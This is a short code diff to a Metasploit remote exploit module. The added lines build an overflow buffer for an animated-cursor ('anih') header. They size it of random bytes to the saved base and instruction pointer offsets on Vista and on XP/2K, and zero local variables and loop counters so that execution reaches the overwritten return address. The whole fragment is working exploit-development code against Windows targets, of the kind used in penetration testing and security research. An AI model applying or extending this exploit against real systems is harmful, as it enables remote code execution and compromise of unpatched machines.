@@ -212,6 +212,20 @@ class MetasploitModule < Msf::Exploit::Remote
     ].pack('V9')
 
     anih_b = nil
+
+    if (target.name =~ /Vista/)
+      # Vista has ebp=80, eip=84   (base pointer, instruction pointer)
+      anih_b = rand_text(84)
+
+      # Patch local variables and loop counters
+      anih_b[68, 12] = [0].pack("V") * 3  # 32-bit unsigned, VAX (little-endian) byte order (.pack)
+    else
+      # XP/2K has ebp=76, eip=80
+      anih_b = rand_text(80)
+
+      # Patch local variables and loop counters
+      anih_b[64, 12] = [0].pack("V") * 3  # 32-bit unsigned, VAX (little-endian) byte order (.pack)
+    end
   end
 
   #
